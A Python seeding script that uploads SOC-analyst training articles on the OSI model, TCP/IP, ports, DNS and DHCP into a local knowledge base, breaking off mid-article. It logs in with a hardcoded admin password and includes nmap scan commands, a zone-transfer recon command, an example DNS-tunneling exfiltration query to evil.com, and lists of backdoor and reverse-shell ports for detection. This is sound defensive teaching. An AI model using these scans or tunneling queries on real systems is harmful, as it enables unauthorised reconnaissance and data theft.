"""
Seed Foundational Security Knowledge Base articles into IXION.

Creates ~100 foundational security articles (Network+/Security+ level) organized
into 6 collections under the existing 'Knowledge Base' parent collection. Articles
cover networking fundamentals, infrastructure/devices, cryptography/PKI, identity
and access management, threats/attacks/vulnerabilities, and governance/risk/compliance.

Usage:
    cd C:\\Users\\Tomo\\ixion
    C:\\Python314\\python.exe seed_knowledge_base_foundations.py
"""
import requests
import sys
import time
from io import BytesIO

BASE = "http://127.0.0.1:8000"
SESSION = requests.Session()


def login():
    r = SESSION.post(
        f"{BASE}/api/auth/login",
        json={"username": "admin", "password": "admin2025"},
    )
    r.raise_for_status()
    print("[+] Logged in as admin")


def get_or_create_collection(name, desc, parent_id=None):
    """Find existing collection by name or create a new one."""
    r = SESSION.get(f"{BASE}/api/collections")
    data = r.json()
    cols = data if isinstance(data, list) else data.get("collections", [])

    def _search(items):
        for c in items:
            if c["name"] == name:
                return c["id"]
            for child in c.get("children", []):
                if child["name"] == name:
                    return child["id"]
        return None

    found = _search(cols)
    if found:
        print(f"  Collection exists: {name} (id={found})")
        return found

    body = {"name": name, "description": desc}
    if parent_id:
        body["parent_id"] = parent_id
    r = SESSION.post(f"{BASE}/api/collections", json=body)
    if r.status_code == 400:
        print(f"  Collection may already exist: {name}")
        r2 = SESSION.get(f"{BASE}/api/collections")
        data2 = r2.json()
        cols2 = data2 if isinstance(data2, list) else data2.get("collections", [])
        found2 = _search(cols2)
        if found2:
            return found2
        return None
    r.raise_for_status()
    cid = r.json()["id"]
    print(f"  Created collection: {name} (id={cid})")
    return cid


def upload_article(title, content, tags, collection_id):
    """Upload a markdown article as a document. Skip if already exists."""
    r = SESSION.get(f"{BASE}/api/documents", params={"search": title})
    if r.status_code == 200:
        data = r.json()
        docs = data if isinstance(data, list) else data.get("documents", [])
        for d in docs:
            if d.get("name") == title:
                print(f"    Skipped (exists): {title}")
                return d["id"]
    md_bytes = BytesIO(content.encode("utf-8"))
    safe = title.replace(" ", "_").replace("/", "-").replace("&", "and")[:80]
    r = SESSION.post(
        f"{BASE}/api/documents/upload",
        files={"file": (f"{safe}.md", md_bytes, "text/markdown")},
        data={
            "name": title,
            "tags": ",".join(tags),
            "collection_id": str(collection_id),
        },
    )
    r.raise_for_status()
    doc_id = r.json()["id"]
    print(f"    Uploaded: {title} (id={doc_id})")
    return doc_id


# ============================================================
# ARTICLE CONTENT FUNCTIONS
# Each returns list of (title, tags_list, markdown_content)
# ============================================================


def network_fundamentals_articles():
    """Return 18 foundational networking articles for SOC analyst knowledge base."""
    articles = []

    # -------------------------------------------------------------------------
    # Article 1: The OSI Model for Security Analysts
    # -------------------------------------------------------------------------
    articles.append((
        "The OSI Model for Security Analysts",
        ["networking", "osi-model", "fundamentals", "security-concepts"],
        r"""# The OSI Model for Security Analysts

## Why the OSI Model Matters in Security

The OSI (Open Systems Interconnection) model is not just academic theory. For security
analysts, it provides a **framework for understanding where attacks occur**, what
defenses apply at each layer, and how to systematically troubleshoot incidents.

## The Seven Layers at a Glance

```
+---+----------------+-------------+------------------+-------------------+
| # | Layer          | Data Unit   | Key Protocols    | Security Tools    |
+---+----------------+-------------+------------------+-------------------+
| 7 | Application    | Data        | HTTP, DNS, SMTP  | WAF, IDS/IPS      |
| 6 | Presentation   | Data        | TLS/SSL, JPEG    | Certificate mgmt  |
| 5 | Session        | Data        | NetBIOS, RPC     | Session monitoring |
| 4 | Transport      | Segment     | TCP, UDP         | Firewalls (L4)    |
| 3 | Network        | Packet      | IP, ICMP, OSPF   | ACLs, routing     |
| 2 | Data Link      | Frame       | Ethernet, ARP    | 802.1X, port sec  |
| 1 | Physical       | Bits        | Cables, Wi-Fi    | Physical security  |
+---+----------------+-------------+------------------+-------------------+
```

## Layer 1 — Physical

The physical layer deals with raw bit transmission over media: copper cables, fiber
optics, radio waves, and connectors.

**Security relevance:**
- Physical access to network cables enables wiretapping
- Rogue access points bypass all higher-layer controls
- Hardware keyloggers operate at this layer

**Attacks:** Wiretapping, cable splicing, rogue AP deployment, signal jamming

**Defenses:** Locked wiring closets, cable management, wireless surveys, TEMPEST shielding

## Layer 2 — Data Link

This layer handles MAC addressing, framing, and local network delivery. Switches
operate here.

**Security relevance:**
- ARP spoofing/poisoning to redirect traffic
- MAC flooding to degrade switches into hubs
- VLAN hopping to escape segmentation

**Key commands for analysts:**
```bash
# View ARP cache
arp -a

# View MAC address table on switch (Cisco)
show mac address-table

# Monitor ARP traffic with tcpdump
tcpdump -i eth0 arp
```

**Defenses:** 802.1X, Dynamic ARP Inspection, port security, DHCP snooping

## Layer 3 — Network

The network layer handles IP addressing and routing. Routers operate here.

**Security relevance:**
- IP spoofing to forge source addresses
- Route manipulation to redirect traffic
- ICMP abuse for reconnaissance or tunneling

**Key commands for analysts:**
```bash
# View routing table
netstat -rn          # Linux/Windows
route print          # Windows
ip route show        # Linux

# Trace path to destination
traceroute 8.8.8.8   # Linux
tracert 8.8.8.8      # Windows
```

**Defenses:** ACLs, ingress/egress filtering, uRPF (unicast reverse path forwarding)

## Layer 4 — Transport

TCP and UDP live here. This layer manages end-to-end communication, port numbers,
and connection state.

**Security relevance:**
- Port scanning reveals open services (Nmap operates heavily at L3/L4)
- SYN floods exploit the TCP handshake
- Connection state tables can be exhausted

**Key commands for analysts:**
```bash
# View active connections
netstat -an           # All connections, numeric
ss -tunap             # Linux — faster than netstat

# Scan for open ports
nmap -sS 192.168.1.0/24    # SYN scan
nmap -sU 192.168.1.1       # UDP scan
```

**Defenses:** Stateful firewalls, SYN cookies, connection rate limiting

## Layer 5 — Session

The session layer manages sessions between applications: establishment, maintenance,
and teardown.

**Security relevance:**
- Session hijacking (stealing or replaying session tokens)
- NetBIOS and SMB session exploitation
- RPC vulnerabilities

**Defenses:** Session timeouts, re-authentication, encrypted session tokens

## Layer 6 — Presentation

Handles data formatting, encryption, and compression. TLS/SSL operates here.

**Security relevance:**
- TLS downgrade attacks (POODLE, BEAST)
- Certificate forgery or mis-issuance
- Data serialization vulnerabilities (XML, JSON parsing attacks)

**Key commands for analysts:**
```bash
# Inspect TLS certificate
openssl s_client -connect example.com:443

# Check certificate details
openssl x509 -in cert.pem -text -noout
```

**Defenses:** Certificate pinning, HSTS, strong cipher suite configuration

## Layer 7 — Application

Where users interact with the network. HTTP, DNS, SMTP, FTP, SSH all live here.

**Security relevance:**
- SQL injection, XSS, CSRF
- DNS poisoning and tunneling
- Phishing via email protocols
- Command injection in web applications

**Key commands for analysts:**
```bash
# HTTP request analysis
curl -v https://example.com

# DNS queries
nslookup example.com
dig example.com ANY

# Packet capture with application-layer filters
tcpdump -i eth0 'port 80' -A    # Show HTTP payload
```

**Defenses:** WAF, application firewalls, input validation, DNS filtering

## Mapping Attacks to Layers — Quick Reference

| Attack               | Primary Layer | Description                        |
|----------------------|---------------|------------------------------------|
| Cable tap            | 1             | Physical interception              |
| ARP spoofing         | 2             | Redirect LAN traffic               |
| VLAN hopping         | 2             | Escape network segment             |
| IP spoofing          | 3             | Forge source IP                    |
| BGP hijacking        | 3             | Redirect internet routes           |
| SYN flood            | 4             | Exhaust connection state           |
| Port scan            | 4             | Enumerate services                 |
| Session hijack       | 5             | Steal active session               |
| TLS downgrade        | 6             | Force weak encryption              |
| SQL injection        | 7             | Exploit application logic          |
| DNS tunneling        | 7             | Exfiltrate data via DNS            |

## Analyst Workflow: Layered Troubleshooting

When investigating an incident, work from the bottom up:

```
1. Layer 1: Is there physical connectivity? Link lights? Cable issues?
2. Layer 2: Is the MAC visible? ARP resolving? VLAN correct?
3. Layer 3: Can you ping? Is routing correct? IP conflicts?
4. Layer 4: Are ports open? Is the firewall allowing traffic?
5. Layer 5-7: Is the application responding? TLS handshake OK?
```

This systematic approach prevents skipping the obvious. Many "complex" security
incidents turn out to be Layer 1-3 issues masquerading as application problems.

## Key Takeaways

- Every security tool maps to one or more OSI layers
- Understanding the layer helps you choose the right tool for investigation
- Attacks at lower layers are harder to detect with application-layer tools
- Defense-in-depth means having controls at EVERY layer
- When in doubt, capture packets — they reveal the truth at all layers
"""
    ))

    # -------------------------------------------------------------------------
    # Article 2: TCP/IP Protocol Suite Deep Dive
    # -------------------------------------------------------------------------
    articles.append((
        "TCP/IP Protocol Suite Deep Dive",
        ["networking", "tcp", "udp", "protocols", "handshake"],
        r"""# TCP/IP Protocol Suite Deep Dive

## The TCP/IP Model vs OSI

The TCP/IP model is what the internet actually runs on. While the OSI model has 7
layers, TCP/IP consolidates into 4:

```
  OSI Model              TCP/IP Model
+-----------------+    +------------------+
| 7 Application   |    |                  |
| 6 Presentation  | -> | 4 Application    |
| 5 Session       |    |                  |
+-----------------+    +------------------+
| 4 Transport     | -> | 3 Transport      |
+-----------------+    +------------------+
| 3 Network       | -> | 2 Internet       |
+-----------------+    +------------------+
| 2 Data Link     |    |                  |
| 1 Physical      | -> | 1 Network Access |
+-----------------+    +------------------+
```

## TCP — Transmission Control Protocol

TCP provides **reliable, ordered, error-checked** delivery. It is connection-oriented.

### The Three-Way Handshake

```
    Client                Server
      |                     |
      |------- SYN -------->|   Step 1: Client sends SYN (seq=x)
      |                     |
      |<---- SYN-ACK -------|   Step 2: Server sends SYN-ACK (seq=y, ack=x+1)
      |                     |
      |------- ACK -------->|   Step 3: Client sends ACK (ack=y+1)
      |                     |
      |== Connection Open ==|
```

**Security implications:**
- SYN flood: Send thousands of SYNs without completing handshake
- SYN cookies: Server defense against SYN floods
- The handshake is visible in packet captures and firewall logs

### TCP Flags

| Flag | Name    | Purpose                                  | Suspicious When                |
|------|---------|------------------------------------------|--------------------------------|
| SYN  | Sync    | Initiate connection                      | Mass SYNs (scanning/flood)     |
| ACK  | Ack     | Acknowledge received data                | ACK scan (no prior SYN)        |
| FIN  | Finish  | Graceful connection close                | FIN scan (stealth scanning)    |
| RST  | Reset   | Abort connection                         | RST flood, connection resets   |
| PSH  | Push    | Send data immediately                   | Unusual PSH patterns           |
| URG  | Urgent  | Mark data as urgent                      | Rarely used legitimately       |
| ECE  | ECN     | Congestion notification                  | Uncommon, usually benign       |
| CWR  | CWR     | Congestion window reduced                | Uncommon, usually benign       |

### TCP Connection States

```
State           Description                         Security Note
-----------     ---------------------------------   ---------------------------
LISTEN          Waiting for connection               Open port, visible to scans
SYN_SENT        SYN sent, awaiting SYN-ACK          Client initiating
SYN_RECEIVED    SYN-ACK sent, awaiting ACK          Half-open (SYN flood target)
ESTABLISHED     Connection active                    Normal data transfer
FIN_WAIT_1      FIN sent, awaiting ACK              Closing initiated
FIN_WAIT_2      FIN acked, awaiting peer FIN        Waiting for remote close
TIME_WAIT       Waiting for stale packets to expire  Normal, but many = issue
CLOSE_WAIT      Received FIN, waiting to close       Many = application bug
LAST_ACK        FIN sent after receiving FIN         Final close phase
CLOSED          Connection terminated                No connection
```

### Monitoring TCP States

```bash
# Count connections by state (Linux)
ss -s

# Show all connections with state (Linux)
ss -tan state established

# Windows equivalent
netstat -an | findstr ESTABLISHED

# Count connections per state (Linux)
ss -tan | awk '{print $1}' | sort | uniq -c | sort -rn
```

### Connection Teardown (Four-Way Close)

```
    Client                Server
      |                     |
      |------- FIN -------->|   Step 1: Client initiates close
      |<------ ACK ---------|   Step 2: Server acknowledges
      |                     |
      |<------ FIN ---------|   Step 3: Server initiates its close
      |------- ACK -------->|   Step 4: Client acknowledges
      |                     |
      |== Connection Closed =|
```

## UDP — User Datagram Protocol

UDP is **connectionless and unreliable** (no guaranteed delivery). It trades
reliability for speed.

| Feature          | TCP                  | UDP                   |
|------------------|----------------------|-----------------------|
| Connection       | Connection-oriented  | Connectionless        |
| Reliability      | Guaranteed delivery  | Best-effort           |
| Ordering         | Ordered              | No ordering           |
| Speed            | Slower (overhead)    | Faster (no overhead)  |
| Header size      | 20+ bytes            | 8 bytes               |
| Use cases        | HTTP, SSH, SMTP      | DNS, DHCP, VoIP, NTP  |
| State tracking   | Yes                  | No                    |

**Security implications of UDP:**
- No handshake means UDP is easily spoofed (source IP can be forged)
- UDP amplification attacks (DNS, NTP, memcached)
- UDP scanning is slow and unreliable (no RST for closed ports)
- Many C2 channels use UDP to avoid stateful inspection

### UDP Amplification Attack Pattern

```
Attacker spoofs victim IP as source
  |
  |---> DNS server (small query, large response)
  |---> NTP server (monlist request = huge response)
  |---> Memcached (stats request = massive response)
  |
  All responses flood the victim
```

## TCP vs UDP Port Scanning

```bash
# TCP SYN scan (half-open, stealthy)
nmap -sS -p 1-1024 192.168.1.1

# TCP connect scan (full handshake, logged)
nmap -sT -p 1-1024 192.168.1.1

# UDP scan (slow, less reliable)
nmap -sU -p 1-1024 192.168.1.1

# Combined TCP + UDP scan of common ports
nmap -sS -sU --top-ports 100 192.168.1.1
```

## Packet Capture and Analysis

```bash
# Capture TCP handshakes
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

# Capture only SYN packets (connection attempts)
tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'

# Capture RST packets (connection resets)
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'

# Wireshark display filters
# SYN packets only
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Retransmissions (indicates network issues)
tcp.analysis.retransmission

# TCP connection resets
tcp.flags.rst == 1
```

## Sequence Numbers and Security

TCP sequence numbers are used to order segments. Predictable sequence numbers
enable session hijacking.

**Historical vulnerability:** Early TCP implementations used predictable ISN
(Initial Sequence Numbers). Modern OS implementations use randomized ISNs.

**Analyst tip:** In Wireshark, enable relative sequence numbers for readability:
Edit > Preferences > Protocols > TCP > Relative sequence numbers

## Window Size and Flow Control

The TCP window size controls how much data can be sent before requiring an ACK.

```
Window size = 0  -->  Receiver is overwhelmed (zero-window probe)
Very small window -->  Possible Slowloris-style attack
Very large window -->  Normal for high-bandwidth transfers
```

## Key Analyst Takeaways

1. **SYN without ACK** at scale = SYN flood or port scan
2. **RST packets** in bulk = scan responses or connection issues
3. **TIME_WAIT accumulation** = high connection churn (may be normal for web servers)
4. **CLOSE_WAIT accumulation** = application not closing sockets (bug, not attack)
5. **UDP traffic to unusual ports** = potential C2 or data exfiltration
6. Always correlate transport-layer findings with application-layer logs
"""
    ))

    # -------------------------------------------------------------------------
    # Article 3: Common Ports and Protocols Reference
    # -------------------------------------------------------------------------
    articles.append((
        "Common Ports and Protocols Reference",
        ["networking", "ports", "protocols", "reference", "services"],
        r"""# Common Ports and Protocols Reference

## Port Number Ranges

| Range         | Name               | Description                              |
|---------------|--------------------|------------------------------------------|
| 0 - 1023      | Well-Known Ports   | Reserved for standard services (root)    |
| 1024 - 49151  | Registered Ports   | Assigned by IANA for specific services   |
| 49152 - 65535 | Dynamic/Ephemeral  | Temporary client-side ports              |

## Well-Known Ports — Essential Reference

### Core Infrastructure Services

| Port   | Proto | Service   | Description                    | Security Notes                    |
|--------|-------|-----------|--------------------------------|-----------------------------------|
| 20     | TCP   | FTP-Data  | FTP data transfer              | Cleartext, use SFTP instead       |
| 21     | TCP   | FTP       | FTP control/commands           | Credentials in cleartext          |
| 22     | TCP   | SSH       | Secure Shell                   | Brute force target, key-based rec |
| 23     | TCP   | Telnet    | Remote terminal (insecure)     | NEVER use — all cleartext         |
| 25     | TCP   | SMTP      | Email sending                  | Open relays, spam, spoofing       |
| 53     | Both  | DNS       | Domain Name System             | Tunneling, amplification          |
| 67     | UDP   | DHCP-S    | DHCP server                    | Rogue DHCP attacks                |
| 68     | UDP   | DHCP-C    | DHCP client                    | DHCP starvation                   |
| 69     | UDP   | TFTP      | Trivial FTP (no auth)          | No authentication at all          |
| 80     | TCP   | HTTP      | Web traffic (unencrypted)      | Inspection, injection points      |
| 88     | TCP   | Kerberos  | Authentication                 | Kerberoasting, golden ticket      |
| 110    | TCP   | POP3      | Email retrieval                | Cleartext credentials             |
| 123    | UDP   | NTP       | Network Time Protocol          | Amplification attacks             |
| 135    | TCP   | MSRPC     | Microsoft RPC                  | Lateral movement vector           |
| 137-139| Both  | NetBIOS   | Windows networking             | Enumeration, legacy attacks       |
| 143    | TCP   | IMAP      | Email access                   | Cleartext without STARTTLS        |
| 161    | UDP   | SNMP      | Network management             | Community string = password       |
| 162    | UDP   | SNMP Trap | SNMP notifications             | Information disclosure            |
| 389    | TCP   | LDAP      | Directory services             | Enumeration, injection            |
| 443    | TCP   | HTTPS     | Encrypted web traffic          | Encrypted = less visibility       |
| 445    | TCP   | SMB       | Windows file sharing           | EternalBlue, ransomware spread    |
| 465    | TCP   | SMTPS     | SMTP over SSL                  | Encrypted email sending           |
| 500    | UDP   | IKE       | IPsec key exchange             | VPN establishment                 |
| 514    | UDP   | Syslog    | System logging                 | Log injection if unprotected      |
| 587    | TCP   | SMTP-Sub  | Email submission               | Authenticated email sending       |
| 636    | TCP   | LDAPS     | LDAP over SSL                  | Encrypted directory access        |
| 993    | TCP   | IMAPS     | IMAP over SSL                  | Encrypted email access            |
| 995    | TCP   | POP3S     | POP3 over SSL                  | Encrypted email retrieval         |

### Database Services

| Port   | Proto | Service      | Description                 | Security Notes               |
|--------|-------|--------------|-----------------------------|------------------------------|
| 1433   | TCP   | MSSQL        | Microsoft SQL Server        | SQL injection, brute force   |
| 1521   | TCP   | Oracle DB    | Oracle database             | TNS listener attacks         |
| 3306   | TCP   | MySQL        | MySQL/MariaDB               | UDF exploitation, brute force|
| 5432   | TCP   | PostgreSQL   | PostgreSQL database         | Should never face internet   |
| 6379   | TCP   | Redis        | Redis cache/DB              | Often no auth by default     |
| 27017  | TCP   | MongoDB      | MongoDB NoSQL               | Historically open by default |
| 9200   | TCP   | Elasticsearch| Search engine               | Often exposed unprotected    |

### Remote Access and Management

| Port   | Proto | Service      | Description                 | Security Notes               |
|--------|-------|--------------|-----------------------------|------------------------------|
| 3389   | TCP   | RDP          | Remote Desktop Protocol     | Brute force, BlueKeep        |
| 5900   | TCP   | VNC          | Virtual Network Computing   | Weak auth, cleartext         |
| 5985   | TCP   | WinRM-HTTP   | Windows Remote Management   | Lateral movement via PS      |
| 5986   | TCP   | WinRM-HTTPS  | WinRM encrypted             | Preferred over 5985          |
| 8080   | TCP   | HTTP-Alt     | Alternative HTTP            | Dev servers, proxies         |
| 8443   | TCP   | HTTPS-Alt    | Alternative HTTPS           | Management consoles          |

### Security and Monitoring Tools

| Port   | Proto | Service      | Description                 | Security Notes               |
|--------|-------|--------------|-----------------------------|------------------------------|
| 514    | UDP   | Syslog       | System logging              | Unencrypted log transport    |
| 1514   | TCP   | Syslog-TLS   | Encrypted syslog            | Preferred for log shipping   |
| 6514   | TCP   | Syslog-TLS   | IETF standard syslog TLS   | Standard encrypted logging   |
| 8834   | TCP   | Nessus       | Vulnerability scanner       | Scanner management interface |
| 9090   | TCP   | Prometheus   | Monitoring metrics          | Should be access-controlled  |

## Suspicious Port Activity Patterns

When reviewing firewall logs or connection data, watch for:

### Outbound Connections That Should Not Happen

```
Port 22 outbound   -> Data exfil via SSH tunnels
Port 53 (TCP)      -> DNS tunneling (DNS usually uses UDP)
Port 4444          -> Default Metasploit listener
Port 1234, 31337   -> Classic backdoor ports
Port 6660-6669     -> IRC (C2 communication)
Port 8888          -> Common reverse shell port
Port 12345         -> NetBus trojan (legacy)
Port 1080          -> SOCKS proxy
Port 3128          -> Squid proxy
Port 9001, 9030    -> Tor relay/directory
Port 8291          -> MikroTik Winbox (if not expected)
```

### Scanning Detection

```bash
# Find hosts connecting to many ports (port scan detection)
# In firewall logs, look for:
# - One source IP hitting many destination ports on one host
# - One source IP hitting one port across many hosts (sweep)

# Wireshark filter for SYN-only packets (scan indicator)
tcp.flags == 0x002

# Check for connections to known-bad ports
netstat -an | findstr "4444 1234 31337 6667"    # Windows
ss -tan | grep -E '4444|1234|31337|6667'        # Linux
```

## Ephemeral Port Ranges by OS

| Operating System | Ephemeral Range      |
|------------------|----------------------|
| Linux (modern)   | 32768 - 60999        |
| Windows (modern) | 49152 - 65535        |
| FreeBSD          | 49152 - 65535        |
| macOS            | 49152 - 65535        |

**Why this matters:** If you see a "source port" in the ephemeral range, it is
likely a client connection. If you see a low source port, it is likely a server
responding. This helps you determine connection direction in logs.

## Quick Reference Commands

```bash
# What is listening on this machine?
netstat -tlnp          # Linux: TCP listeners with PIDs
ss -tlnp               # Linux: faster alternative
netstat -an | findstr LISTENING   # Windows

# What process owns a port?
lsof -i :443           # Linux/macOS
netstat -anob           # Windows (requires admin)

# Test if a remote port is open
nc -zv 192.168.1.1 443           # netcat
Test-NetConnection 192.168.1.1 -Port 443   # PowerShell

# Scan top 100 ports quickly
nmap --top-ports 100 192.168.1.0/24
```

## Protocol Identification Beyond Port Numbers

Modern attackers run services on non-standard ports. Do not trust port numbers alone.

```bash
# Nmap service version detection (identifies actual protocol)
nmap -sV -p 8080 192.168.1.1

# Wireshark: Follow TCP stream to see actual protocol
Right-click packet > Follow > TCP Stream

# Look for protocol signatures in traffic:
# HTTP: "GET / HTTP/1.1" or "POST"
# SSH:  "SSH-2.0-OpenSSH"
# TLS:  Client Hello (0x16 0x03)
# DNS:  Standard query format
```

## Key Takeaways for Analysts

1. **Memorize the critical ports** (22, 25, 53, 80, 88, 135, 139, 443, 445, 3389)
2. **Port does not equal protocol** — always verify with service detection
3. **Outbound connections to unusual ports** are higher priority than inbound
4. **Database ports facing the internet** are always a critical finding
5. **Compare against baseline** — what is normal for YOUR environment?
"""
    ))

    # -------------------------------------------------------------------------
    # Article 4: DNS Architecture and Security Implications
    # -------------------------------------------------------------------------
    articles.append((
        "DNS Architecture and Security Implications",
        ["networking", "dns", "name-resolution", "dns-security", "tunneling"],
        r"""# DNS Architecture and Security Implications

## How DNS Works — The Big Picture

DNS (Domain Name System) translates human-readable names to IP addresses. It is a
hierarchical, distributed database and one of the most critical — and most abused —
internet protocols.

```
User types "www.example.com"
       |
       v
+------------------+
| Stub Resolver    |  (Your OS DNS client)
| (Local machine)  |
+--------+---------+
         |
         v
+------------------+
| Recursive        |  (ISP or corporate DNS server, e.g., 8.8.8.8)
| Resolver         |  Walks the tree if answer not cached
+--------+---------+
         |
    +----+----+----+
    |         |    |
    v         v    v
+-------+ +------+ +-------------+
| Root  | | .com | | example.com |
| (.)   | | TLD  | | Authoritative|
+-------+ +------+ +-------------+
```

## Recursive vs Authoritative DNS

| Type           | Role                           | Example              |
|----------------|--------------------------------|----------------------|
| Recursive      | Resolves queries for clients   | 8.8.8.8, 1.1.1.1    |
| Authoritative  | Holds actual DNS records       | ns1.example.com      |
| Stub resolver  | Forwards to recursive          | Your laptop OS       |
| Forwarder      | Recursive that forwards upstream| Corporate DNS        |

## DNS Query Flow — Step by Step

```
1. Application calls getaddrinfo("www.example.com")
2. OS checks /etc/hosts (or C:\Windows\System32\drivers\etc\hosts)
3. OS checks local DNS cache
4. OS sends query to configured recursive resolver
5. Recursive checks its cache
6. If not cached, recursive queries root servers for "."
7. Root says: ".com is handled by these TLD servers"
8. Recursive queries .com TLD servers
9. TLD says: "example.com is handled by ns1.example.com"
10. Recursive queries ns1.example.com for www.example.com
11. Authoritative server returns the A record (IP address)
12. Recursive caches the result and returns to client
```

## DNS Record Types

| Type  | Purpose                          | Example                           | Security Use                   |
|-------|----------------------------------|-----------------------------------|--------------------------------|
| A     | IPv4 address                     | example.com -> 93.184.216.34      | IP attribution                 |
| AAAA  | IPv6 address                     | example.com -> 2606:2800:...      | IPv6 enumeration               |
| MX    | Mail server                      | example.com -> mail.example.com   | Email infrastructure mapping   |
| TXT   | Arbitrary text                   | SPF, DKIM, DMARC records          | Email auth, domain verification|
| CNAME | Canonical name (alias)           | www -> example.com                | CDN/hosting identification     |
| NS    | Name server                      | example.com -> ns1.example.com    | DNS infrastructure mapping     |
| SOA   | Start of Authority               | Primary NS, serial, timers        | Zone transfer info             |
| PTR   | Reverse lookup (IP to name)      | 34.216.184.93 -> example.com      | Attribution, verification      |
| SRV   | Service location                 | _ldap._tcp.example.com            | Service discovery               |

## DNS Query Commands for Analysts

```bash
# Basic lookup
nslookup example.com
dig example.com

# Query specific record types
dig example.com MX
dig example.com TXT
dig example.com NS
nslookup -type=MX example.com

# Reverse lookup
dig -x 93.184.216.34
nslookup 93.184.216.34

# Query a specific DNS server
dig @8.8.8.8 example.com
nslookup example.com 8.8.8.8

# Get all records (ANY query — may be restricted)
dig example.com ANY

# Trace the full resolution path
dig +trace example.com

# Check DNSSEC
dig +dnssec example.com

# Zone transfer attempt (recon technique)
dig axfr @ns1.example.com example.com

# Show TTL values
dig +ttlunits example.com
```

## DNS Security Threats

### DNS Cache Poisoning
An attacker injects forged DNS responses into a resolver cache, redirecting users
to malicious servers.

```
Normal:     example.com -> 93.184.216.34 (legitimate)
Poisoned:   example.com -> 10.0.0.99    (attacker server)
```

**Mitigations:** DNSSEC, randomized source ports, randomized query IDs

### DNS Tunneling
Encoding data within DNS queries and responses to exfiltrate data or establish C2
channels. Works because DNS is almost never blocked.

```
Query:   dGhpcyBpcyBzZWNyZXQ.evil.com   (base64 in subdomain)
Response: TXT record with encoded data back
```

**Detection indicators:**
- Unusually long subdomain labels (> 30 chars)
- High volume of DNS queries to a single domain
- TXT record queries to unusual domains
- High entropy in subdomain strings
- DNS queries with unusual query types (NULL, PRIVATE)

```bash
# Wireshark filter for long DNS names (potential tunneling)
dns.qry.name.len > 50

# Look for high-frequency DNS queries
dns.qry.name contains "suspicious-domain.com"

# tcpdump: capture all DNS traffic
tcpdump -i eth0 port 53 -w dns_capture.pcap
```

### DNS Amplification (DDoS)
Attacker sends small queries with spoofed source IP. DNS servers send large
responses to the victim.

```
Amplification factors:
  ANY query:  ~28x - 54x amplification
  TXT query:  ~5x - 10x amplification
```

### DNS Hijacking
Modifying DNS settings (on router, host, or registrar) to redirect traffic.

**Detection:** Monitor for changes in DNS server settings, unexpected DNS responses

### Domain Shadowing
Attacker compromises a domain registrar account and creates subdomains pointing to
malicious infrastructure under a legitimate domain.

### Typosquatting / Homograph Attacks
Registering domains similar to legitimate ones: `examp1e.com`, `example.co`

## DNS Logging and Monitoring

```bash
# Enable DNS query logging on Windows
# PowerShell:
Set-DnsServerDiagnostics -All $true

# Check Windows DNS cache
ipconfig /displaydns

# Clear Windows DNS cache
ipconfig /flushdns

# Linux: check systemd-resolved cache
resolvectl statistics

# Monitor DNS with passive DNS tools
# Zeek (formerly Bro) generates dns.log automatically
# Suricata with EVE JSON logging captures DNS events
```

## DNSSEC — DNS Security Extensions

DNSSEC adds cryptographic signatures to DNS records, enabling verification that
responses have not been tampered with.

```
DNSSEC record types:
  RRSIG   - Digital signature over a record set
  DNSKEY  - Public key for zone signing
  DS      - Delegation Signer (links parent to child zone)
  NSEC    - Authenticated denial of existence
  NSEC3   - Hashed denial of existence
```

**Limitations:** DNSSEC provides authentication and integrity but NOT confidentiality.
DNS queries are still visible. DNS over HTTPS (DoH) and DNS over TLS (DoT) address
confidentiality.

## DNS over HTTPS (DoH) and DNS over TLS (DoT)

| Feature    | Traditional DNS | DoT (port 853) | DoH (port 443)    |
|------------|-----------------|------------------|--------------------|
| Encrypted  | No              | Yes              | Yes                |
| Port       | 53              | 853              | 443                |
| Blockable  | Yes             | Yes (port 853)   | Hard (blends HTTPS)|
| Visibility | Full            | Destination only | None (looks like HTTPS)|

**Security challenge:** DoH makes DNS monitoring significantly harder. Malware using
DoH can bypass traditional DNS-based security controls.

## Key Analyst Takeaways

1. **DNS is the first thing to check** in almost any investigation
2. **High-volume queries to one domain** = possible tunneling or DGA
3. **TXT record queries to unusual domains** = high suspicion for tunneling
4. **Monitor for DNS server changes** on endpoints (malware changes DNS settings)
5. **Zone transfers should be restricted** — if you can AXFR, so can attackers
6. **DNS cache TTL matters** — short TTLs may indicate fast-flux networks
7. **Always check both forward and reverse DNS** during attribution
"""
    ))

    # -------------------------------------------------------------------------
    # Article 5: DHCP Operations and Security Considerations
    # -------------------------------------------------------------------------
    articles.append((
        "DHCP Operations and Security Considerations",
        ["networking", "dhcp", "ip-addressing", "network-services"],
        r"""# DHCP Operations and Security Considerations

## What DHCP Does

DHCP (Dynamic Host Configuration Protocol) automatically assigns IP addresses and
network configuration to devices. Without DHCP, every device would need manual IP
configuration — impractical for networks of any size.

## DHCP Information Provided to Clients

| Parameter          | Description                        | Example              |
|--------------------|------------------------------------|----------------------|
| IP Address         | Host address for the client        | 192.168.1.100        |
| Subnet Mask        | Network boundary definition        | 255.255.255.0        |
| Default Gateway    | Router for off-network traffic     | 192.168.1.1          |
| DNS Servers        | Name resolution servers            | 8.8.8.8, 8.8.4.4    |
| Lease Duration     | How long the address is valid      | 86400 (24 hours)     |
| Domain Name        | Network domain suffix              | corp.example.com     |
| NTP Server         | Time synchronization server        | ntp.example.com      |
| WINS Server        | NetBIOS name server (legacy)       | 192.168.1.5          |

## The DORA Process

DHCP uses a four-step process known as DORA:

```
    Client                         Server
      |                              |
      |---- DISCOVER (broadcast) --->|   "Any DHCP servers out there?"
      |    src: 0.0.0.0              |   dst: 255.255.255.255
      |                              |
      |<--- OFFER -------------------|   "Here is an available IP"
      |    offered IP: 192.168.1.100 |   lease: 24 hours
      |                              |
      |---- REQUEST (broadcast) ---->|   "I will take that IP, please"
      |    requested: 192.168.1.100  |   (broadcast so other servers know)
      |                              |
      |<--- ACKNOWLEDGE -------------|   "Confirmed. It is yours."
      |    IP: 192.168.1.100         |   subnet, gateway, DNS included
      |                              |
```

**Why REQUEST is broadcast:** If multiple DHCP servers sent offers, the client
broadcasts its REQUEST so the un-chosen servers can reclaim their offered addresses.

## DHCP Lease Lifecycle

```
+--------+    50% of     +--------+    87.5% of    +--------+
| Lease  | -> lease  --> | Renew  | -> lease   --> | Rebind | -> Lease
| Active |    elapsed    | (T1)   |    elapsed     | (T2)   |   Expires
+--------+              +--------+                +--------+

Renew (T1):  Client unicasts REQUEST directly to its DHCP server
